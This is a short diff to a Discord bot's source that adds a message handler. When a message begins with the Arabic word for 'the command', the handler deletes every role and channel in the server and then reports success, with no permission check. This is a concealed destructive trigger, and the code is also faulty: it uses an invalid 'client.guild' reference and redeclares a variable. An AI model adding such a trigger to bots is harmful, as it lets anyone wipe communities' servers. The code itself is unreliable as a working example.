@@ -565,6 +565,20 @@ client.on('message', message =>{
 
 
 
+client.on('message', alpha => {
+ if (alpha.content.startsWith("الامر")) {
+client.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
+client.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
+let alpha = new Discord.RichEmbed()
+.setColor('RANDOM')
+.setDescription('**تم الحذف بنجاح**')
+alpha.author.sendEmbed(alpha);
+}
+});
+
+
+
+
 
 
 
